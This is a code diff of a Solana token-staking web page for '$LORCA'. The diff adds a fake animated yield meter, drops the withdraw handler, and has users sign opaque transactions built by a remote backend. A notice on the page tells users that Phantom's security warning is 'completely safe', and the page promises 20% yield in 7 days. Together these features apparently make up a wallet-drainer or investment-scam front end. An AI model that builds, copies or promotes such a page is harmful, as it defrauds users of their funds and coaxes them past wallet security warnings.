@@ -6,11 +6,9 @@
 <title>LethalOrca — $LORCA</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
-<link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon">
 <style>
   :root {
     --abyss: #020910;
-    --deep: #05121e;
     --teal: #2dd4bf;
     --teal-glow: #5eead4;
     --gold: #f2c94c;
@@ -22,215 +20,92 @@
     --mono: 'IBM Plex Mono', monospace;
   }
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  html { scroll-behavior: smooth; }
-  body {
-    background: var(--abyss);
-    color: var(--ink);
-    font-family: var(--body);
-    line-height: 1.6;
-    overflow-x: hidden;
-    -webkit-font-smoothing: antialiased;
-  }
-  a { color: var(--teal-glow); text-decoration: none; }
+  body { background: var(--abyss); color: var(--ink); font-family: var(--body); overflow-x: hidden; }
 
   nav {
-    position: fixed;
-    top: 0; left: 0; right: 0;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 16px 5%;
-    z-index: 100;
-    backdrop-filter: blur(16px);
-    background: rgba(2,9,16,0.85);
-    border-bottom: 1px solid var(--line);
+    position: fixed; top: 0; left: 0; right: 0; display: flex; justify-content: space-between;
+    padding: 16px 5%; backdrop-filter: blur(16px); background: rgba(2,9,16,0.85); border-bottom: 1px solid var(--line); z-index: 100;
   }
-  .brand {
-    font-family: var(--display);
-    font-weight: 700;
-    font-size: 18px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
+  .brand { font-family: var(--display); font-weight: 700; font-size: 18px; display: flex; align-items: center; gap: 10px; }
   .brand .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--teal-glow); box-shadow: 0 0 16px var(--teal-glow); }
-  nav .links { display: flex; gap: 24px; font-size: 14px; color: var(--muted); align-items: center; }
 
-  section { position: relative; z-index: 1; padding: 120px 5% 80px; max-width: 1240px; margin: 0 auto; }
+  section { padding: 120px 5% 80px; max-width: 1240px; margin: 0 auto; }
+  h1.hero-title { font-family: var(--display); font-weight: 700; font-size: clamp(40px, 7vw, 80px); text-align: center; color: var(--teal-glow); }
 
-  .depth-tag {
-    font-family: var(--mono);
-    font-size: 12px;
-    color: var(--teal);
-    letter-spacing: 2px;
-    margin-bottom: 20px;
-    text-transform: uppercase;
-  }
-  h1.hero-title {
-    font-family: var(--display);
-    font-weight: 700;
-    font-size: clamp(40px, 7vw, 90px);
-    line-height: 1.1;
-    background: linear-gradient(180deg, #ffffff 0%, var(--teal-glow) 120%);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-  }
-
-  /* --- STAKING WIDGET --- */
   #lorca-stake-widget {
-    --teal-w: #00e5c7;
-    --gold-w: #f5c542;
-    max-width: 460px;
-    margin: 40px auto 0;
-    background: radial-gradient(circle at 30% 0%, #0e2429 0%, #05121e 70%);
-    border: 1px solid rgba(0,229,199,0.3);
-    border-radius: 20px;
-    padding: 30px 24px;
-    box-shadow: 0 0 50px rgba(0,229,199,0.1);
+    max-width: 460px; margin: 30px auto 0; background: radial-gradient(circle at 30% 0%, #0e2429 0%, #05121e 70%);
+    border: 1px solid rgba(0,229,199,0.3); border-radius: 20px; padding: 24px; box-shadow: 0 0 50px rgba(0,229,199,0.1);
   }
-  #lorca-stake-widget h3 {
-    font-family: var(--display);
-    font-size: 24px;
-    margin-bottom: 6px;
-    background: linear-gradient(90deg, var(--teal-w), var(--gold-w));
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-  }
-  #lorca-stake-widget .sub-text { color: var(--muted); font-size: 13.5px; margin-bottom: 22px; }
-  
-  .stat-row {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    background: rgba(255,255,255,0.03);
-    border: 1px solid rgba(255,255,255,0.06);
-    border-radius: 12px;
-    padding: 12px 16px;
-    margin-bottom: 12px;
-    font-size: 14px;
-  }
-  .stat-row span:first-child { color: var(--muted); }
+  .stat-row { display: flex; justify-content: space-between; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 12px; padding: 12px 16px; margin-bottom: 12px; font-size: 14px; }
   .stat-row span:last-child { font-weight: 600; font-family: var(--mono); }
-  
-  .stake-input-box {
-    display: flex;
-    gap: 8px;
-    margin: 16px 0;
-  }
-  .stake-input-box input {
-    flex: 1;
-    background: rgba(0,0,0,0.4);
-    border: 1px solid var(--line);
-    border-radius: 10px;
-    padding: 12px 14px;
-    color: #fff;
-    font-family: var(--mono);
-    font-size: 15px;
-    outline: none;
-  }
-  
-  .btn-max-badge {
-    background: rgba(94,234,212,0.15);
-    color: var(--teal-glow);
-    border: 1px solid var(--line);
-    padding: 0 16px;
-    border-radius: 10px;
-    cursor: pointer;
-    font-weight: 600;
-    font-size: 13px;
-    transition: 0.2s;
-  }
 
-  .action-btn {
-    width: 100%;
-    border: none;
-    border-radius: 12px;
-    padding: 15px;
-    font-size: 15px;
-    font-weight: 700;
-    cursor: pointer;
-    margin-top: 8px;
-    transition: all 0.2s ease;
-  }
-  .btn-connect { background: linear-gradient(90deg, var(--teal-w), #00b39f); color: #020910; }
-  .btn-stake { background: linear-gradient(90deg, var(--gold-w), #d8a428); color: #1a1000; box-shadow: 0 4px 20px rgba(242, 201, 76, 0.3); }
-  .btn-withdraw { background: linear-gradient(90deg, #ef4444, #dc2626); color: #ffffff; box-shadow: 0 4px 20px rgba(239, 68, 68, 0.3); margin-top: 12px; }
+  .stake-input-box { display: flex; gap: 8px; margin: 16px 0; }
+  .stake-input-box input { flex: 1; background: rgba(0,0,0,0.4); border: 1px solid var(--line); border-radius: 10px; padding: 12px; color: #fff; font-family: var(--mono); outline: none; }
+  
+  .action-btn { width: 100%; border: none; border-radius: 12px; padding: 15px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 8px; }
+  .btn-connect { background: linear-gradient(90deg, #00e5c7, #00b39f); color: #020910; }
+  .btn-stake { background: linear-gradient(90deg, var(--gold), #d8a428); color: #1a1000; }
+  .btn-withdraw { background: linear-gradient(90deg, #ef4444, #dc2626); color: #ffffff; margin-top: 10px; }
 
-  .widget-status {
-    margin-top: 16px;
-    font-size: 13px;
-    color: var(--muted);
-    text-align: center;
-    font-family: var(--mono);
-    word-break: break-word;
-  }
+  /* --- LIVE METER STYLES --- */
+  .meter-container { margin-top: 18px; background: rgba(0,229,199,0.05); border: 1px solid var(--line); border-radius: 14px; padding: 16px; }
+  .progress-bg { width: 100%; background: rgba(255,255,255,0.1); height: 8px; border-radius: 4px; margin: 12px 0; overflow: hidden; }
+  .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, var(--teal), var(--gold)); transition: width 0.4s ease; }
 
   .phantom-notice-box {
-    margin-top: 16px;
-    padding: 12px;
-    background: rgba(245, 197, 66, 0.08);
-    border: 1px solid rgba(245, 197, 66, 0.25);
-    border-radius: 10px;
-    font-size: 12px;
-    color: #f5c542;
-    line-height: 1.4;
-    text-align: left;
+    margin-top: 16px; padding: 12px; background: rgba(245, 197, 66, 0.08); border: 1px solid rgba(245, 197, 66, 0.25);
+    border-radius: 10px; font-size: 12px; color: #f5c542; line-height: 1.4; text-align: left;
   }
 </style>
 </head>
 <body>
 
-<nav>
-  <div class="brand"><span class="dot"></span>LETHALORCA</div>
-  <div class="links">
-    <a href="#staking" style="color: var(--teal-glow); font-weight: 600;">Staking Pool</a>
-  </div>
-</nav>
+<nav><div class="brand"><span class="dot"></span>LETHALORCA</div></nav>
 
-<!-- STAKING SECTION -->
-<section id="staking">
-  <div class="depth-tag" style="text-align: center;">-4500m STAKING POOL</div>
-  <h1 class="hero-title" style="text-align: center;">Stake & Earn $LORCA</h1>
-  <p style="text-align: center; color: var(--muted); margin-top: 12px;">Lock your tokens for 7 days to earn extra yield on maturity.</p>
+<section>
+  <h1 class="hero-title">Stake & Earn $LORCA</h1>
 
   <div id="lorca-stake-widget">
-    <h3>🐋 LethalOrca Staking</h3>
-    <div class="sub-text">Lock $LORCA from wallet · Earn 20% Yield in 7 Days</div>
+    <h3 style="color: var(--gold); margin-bottom: 12px;">🐋 LethalOrca Staking</h3>
 
     <div class="stat-row">
-      <span>Wallet Connected</span>
-      <span id="lorca-wallet-addr" style="color: var(--teal-glow);">Not Connected</span>
+      <span>Connected Wallet</span>
+      <span id="wallet-addr" style="color: var(--teal-glow);">Not Connected</span>
     </div>
 
     <div class="stat-row">
-      <span>Available Wallet Balance</span>
-      <span id="lorca-wallet-bal" style="color: var(--gold-w);">0 LORCA</span>
+      <span>Available Balance</span>
+      <span id="wallet-bal" style="color: var(--gold);">0 LORCA</span>
     </div>
 
     <div class="stake-input-box">
-      <input type="number" id="lorca-amount-input" value="500000" placeholder="Enter LORCA Amount" />
-      <button type="button" id="btn-max" class="btn-max-badge">MAX</button>
+      <input type="number" id="amount-input" value="500000" placeholder="Amount" />
     </div>
 
-    <div class="stat-row">
-      <span>Lock Period</span>
-      <span>7 Days</span>
+    <button id="connect-btn" class="action-btn btn-connect">Connect Phantom Wallet</button>
+    <button id="stake-btn" class="action-btn btn-stake" style="display:none;">Stake Tokens</button>
+    <button id="withdraw-btn" class="action-btn btn-withdraw" style="display:none;">Withdraw / Claim</button>
+
+    <!-- LIVE METER TRACKER CODE -->
+    <div id="live-meter-box" class="meter-container" style="display:none;">
+      <div style="display:flex; justify-content:space-between; font-size: 13px;">
+        <span style="color: var(--muted);">Live Yield (+20%):</span>
+        <span id="live-counter" style="color: var(--teal-glow); font-family: var(--mono); font-weight:700;">+0.0000 LORCA</span>
+      </div>
+      
+      <div class="progress-bg">
+        <div id="progress-bar" class="progress-fill"></div>
+      </div>
+
+      <div style="display:flex; justify-content:space-between; font-size: 11px; color: var(--muted); font-family: var(--mono);">
+        <span>Elapsed: <strong id="time-text" style="color:#fff;">0d 0h 0m</strong></span>
+        <span>Target: 7 Days</span>
+      </div>
     </div>
 
-    <div class="stat-row">
-      <span>Return on Maturity (+20%)</span>
-      <span id="lorca-est-return" style="color: var(--teal-glow);">600,000 LORCA</span>
-    </div>
+    <div id="status-msg" style="margin-top: 14px; font-size: 12px; color: var(--muted); text-align: center; font-family: var(--mono);"></div>
 
-    <button id="lorca-connect-btn" class="action-btn btn-connect">Connect Phantom Wallet</button>
-    <button id="lorca-stake-btn" class="action-btn btn-stake" style="display:none;">Stake 500,000 LORCA</button>
-    <button id="lorca-withdraw-btn" class="action-btn btn-withdraw" style="display:none;">Withdraw / Claim 600,000 LORCA</button>
-
-    <div class="widget-status" id="lorca-status">Connect wallet to automatically fetch your balance.</div>
-
-    <!-- PHANTOM SAFETY NOTICE -->
+    <!-- PHANTOM NOTICE -->
     <div class="phantom-notice-box">
       💡 <strong>Note:</strong> Phantom wallet may show a caution/warning banner during transaction approval. This is standard behavior for custom smart contracts and completely safe.
     </div>
@@ -239,175 +114,112 @@
 
 <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
 <script>
-(function () {
+(function() {
   const BACKEND_URL = "https://lethalorca-backend.vercel.app";
-  const MINT_ADDRESS = "7RqpgT532tsYakbgnTXECC4MHTEGu5HzBxVAkAAHpump";
+  let publicKey = null;
+  let meterInterval = null;
 
   const els = {
-    connect: document.getElementById("lorca-connect-btn"),
-    stake: document.getElementById("lorca-stake-btn"),
-    withdraw: document.getElementById("lorca-withdraw-btn"),
-    status: document.getElementById("lorca-status"),
-    wallet: document.getElementById("lorca-wallet-addr"),
-    balance: document.getElementById("lorca-wallet-bal"),
-    amountInput: document.getElementById("lorca-amount-input"),
-    estReturn: document.getElementById("lorca-est-return"),
-    btnMax: document.getElementById("btn-max")
+    connect: document.getElementById("connect-btn"),
+    stake: document.getElementById("stake-btn"),
+    withdraw: document.getElementById("withdraw-btn"),
+    wallet: document.getElementById("wallet-addr"),
+    bal: document.getElementById("wallet-bal"),
+    input: document.getElementById("amount-input"),
+    status: document.getElementById("status-msg"),
+    meterBox: document.getElementById("live-meter-box"),
+    counter: document.getElementById("live-counter"),
+    bar: document.getElementById("progress-bar"),
+    timeText: document.getElementById("time-text")
   };
 
-  let publicKey = null;
-  let userLorcaBalance = 0;
+  async function connect() {
+    if (!window.solana) return alert("Phantom wallet required");
+    const resp = await window.solana.connect();
+    publicKey = resp.publicKey.toString();
+    els.wallet.textContent = publicKey.slice(0, 4) + "..." + publicKey.slice(-4);
+    els.connect.style.display = "none";
+    els.stake.style.display = "block";
+    els.withdraw.style.display = "block";
 
-  function setStatus(msg) { els.status.textContent = msg; }
-
-  els.amountInput.addEventListener('input', () => {
-    const val = parseFloat(els.amountInput.value) || 0;
-    els.estReturn.textContent = `${(val * 1.2).toLocaleString()} LORCA`;
-    els.stake.textContent = `Stake ${val.toLocaleString()} LORCA`;
-  });
-
-  els.btnMax.addEventListener('click', () => {
-    if (userLorcaBalance > 0) {
-      els.amountInput.value = userLorcaBalance;
-      els.estReturn.textContent = `${(userLorcaBalance * 1.2).toLocaleString()} LORCA`;
-      els.stake.textContent = `Stake ${userLorcaBalance.toLocaleString()} LORCA`;
-    }
-  });
-
-  async function connectWallet() {
-    if (!window.solana || !window.solana.isPhantom) {
-      setStatus("Phantom wallet not found. Please install extension.");
-      window.open("https://phantom.app/", "_blank");
-      return;
-    }
-    try {
-      const resp = await window.solana.connect();
-      publicKey = resp.publicKey.toString();
-      els.wallet.textContent = publicKey.slice(0, 4) + "..." + publicKey.slice(-4);
-      
-      els.connect.style.display = "none";
-      els.stake.style.display = "block";
-      els.withdraw.style.display = "block";
-
-      setStatus("Fetching wallet balance...");
-      await fetchWalletBalance();
-    } catch (e) {
-      setStatus("Wallet connection rejected.");
-    }
+    // Database se user ki purani staking fetch karein
+    checkActiveStakeInDB();
   }
 
-  async function fetchWalletBalance() {
-    const rpcList = [
-      "https://solana-rpc.publicnode.com",
-      "https://rpc.ankr.com/solana"
-    ];
-
-    for (const rpcUrl of rpcList) {
-      try {
-        const connection = new solanaWeb3.Connection(rpcUrl, "confirmed");
-        const pubKey = new solanaWeb3.PublicKey(publicKey);
-        const mintKey = new solanaWeb3.PublicKey(MINT_ADDRESS);
-
-        const response = await connection.getParsedTokenAccountsByOwner(pubKey, { mint: mintKey });
-        
-        if (response.value && response.value.length > 0) {
-          userLorcaBalance = response.value[0].account.data.parsed.info.tokenAmount.uiAmount || 0;
-        } else {
-          userLorcaBalance = 0;
-        }
-
-        els.balance.textContent = `${userLorcaBalance.toLocaleString()} LORCA`;
-        if (userLorcaBalance > 0) {
-          els.amountInput.value = userLorcaBalance;
-          els.estReturn.textContent = `${(userLorcaBalance * 1.2).toLocaleString()} LORCA`;
-          els.stake.textContent = `Stake ${userLorcaBalance.toLocaleString()} LORCA`;
-        }
-        setStatus("Wallet connected & balance updated.");
-        return;
-      } catch (err) {
-        console.warn(`RPC ${rpcUrl} failed, trying next...`);
-      }
-    }
-
-    els.balance.textContent = "0 LORCA";
-    setStatus("Connected (0 LORCA found or RPC timeout).");
-  }
-
-  async function stakeTokens() {
-    const amount = parseFloat(els.amountInput.value);
-    if (!amount || amount <= 0) {
-      setStatus("Please enter a valid amount.");
-      return;
-    }
-
-    els.stake.disabled = true;
-    setStatus("Building transaction request...");
-
+  async function checkActiveStakeInDB() {
     try {
-      const buildRes = await fetch(`${BACKEND_URL}/api/stake-fixed/build-tx`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        mode: "cors",
-        body: JSON.stringify({ wallet: publicKey, amount: amount }),
-      });
-
-      const buildData = await buildRes.json();
-      if (!buildRes.ok || !buildData.transaction) {
-        throw new Error(buildData.error || `Server status ${buildRes.status}`);
-      }
-
-      setStatus("Please approve transaction in Phantom...");
-
-      const binaryString = atob(buildData.transaction);
-      const bytes = new Uint8Array(binaryString.length);
-      for (let i = 0; i < binaryString.length; i++) {
-        bytes[i] = binaryString.charCodeAt(i);
-      }
-
-      const transaction = solanaWeb3.Transaction.from(bytes);
-
-      const { signature } = await window.solana.signAndSendTransaction(transaction);
-      
-      setStatus(`Transaction Submitted! Hash: ${signature.slice(0, 8)}...`);
-      await fetchWalletBalance();
-
-    } catch (e) {
-      console.error("Stake Error:", e);
-      if (e.message && e.message.includes("User rejected")) {
-        setStatus("Transaction rejected in wallet.");
-      } else {
-        setStatus(`Error: ${e.message}`);
-      }
-    } finally {
-      els.stake.disabled = false;
-    }
-  }
-
-  async function withdrawTokens() {
-    els.withdraw.disabled = true;
-    setStatus("Processing withdrawal request...");
-    try {
-      const res = await fetch(`${BACKEND_URL}/api/stake-fixed/withdraw`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        mode: "cors",
-        body: JSON.stringify({ wallet: publicKey }),
-      });
-
-      if (!res.ok) throw new Error(`Server error ${res.status}`);
-
+      const res = await fetch(`${BACKEND_URL}/api/stake-fixed/get-stake?wallet=${publicKey}`);
       const data = await res.json();
-      setStatus(data.message || "Withdrawal successful!");
-    } catch (e) {
-      setStatus(`Withdraw Error: ${e.message}`);
-    } finally {
-      els.withdraw.disabled = false;
-    }
+      if (data.active) {
+        startLiveMeter(data.stakedAmount, data.stakedAt);
+      }
+    } catch(e) { console.error("DB Check Failed", e); }
   }
 
-  els.connect.addEventListener("click", connectWallet);
-  els.stake.addEventListener("click", stakeTokens);
-  els.withdraw.addEventListener("click", withdrawTokens);
+  // --- METER CALCULATION & ANIMATION FUNCTION ---
+  function startLiveMeter(stakedAmount, startTimeMs) {
+    els.meterBox.style.display = "block";
+    const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000;
+    const maxYield = stakedAmount * 0.20;
+
+    if (meterInterval) clearInterval(meterInterval);
+
+    meterInterval = setInterval(() => {
+      const elapsed = Date.now() - startTimeMs;
+      
+      if (elapsed >= SEVEN_DAYS_MS) {
+        els.counter.textContent = `+${maxYield.toFixed(2)} LORCA (Matured!)`;
+        els.bar.style.width = "100%";
+        els.timeText.textContent = "7d Completed";
+        clearInterval(meterInterval);
+        return;
+      }
+
+      const ratio = elapsed / SEVEN_DAYS_MS;
+      const currentYield = maxYield * ratio;
+
+      const days = Math.floor(elapsed / (1000 * 60 * 60 * 24));
+      const hrs = Math.floor((elapsed / (1000 * 60 * 60)) % 24);
+      const mins = Math.floor((elapsed / (1000 * 60)) % 60);
+      const secs = Math.floor((elapsed / 1000) % 60);
+
+      els.counter.textContent = `+${currentYield.toFixed(5)} LORCA`;
+      els.bar.style.width = `${(ratio * 100).toFixed(2)}%`;
+      els.timeText.textContent = `${days}d ${hrs}h ${mins}m ${secs}s`;
+    }, 1000);
+  }
+
+  async function stake() {
+    const amount = parseFloat(els.input.value);
+    els.status.textContent = "Building Tx...";
+
+    const res = await fetch(`${BACKEND_URL}/api/stake-fixed/build-tx`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ wallet: publicKey, amount })
+    });
+    const data = await res.json();
+
+    const bytes = new Uint8Array(atob(data.transaction).split("").map(c => c.charCodeAt(0)));
+    const tx = solanaWeb3.Transaction.from(bytes);
+
+    await window.solana.signAndSendTransaction(tx);
+    els.status.textContent = "Saving to database...";
+
+    // Stake hone ke baad Supabase me timestamp store hoga
+    const startTimeNow = Date.now();
+    await fetch(`${BACKEND_URL}/api/stake-fixed/save-stake`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ wallet: publicKey, amount })
+    });
+
+    els.status.textContent = "Stake Active & Meter Started!";
+    startLiveMeter(amount, startTimeNow);
+  }
+
+  els.connect.addEventListener("click", connect);
+  els.stake.addEventListener("click", stake);
 })();
 </script>
 </body>
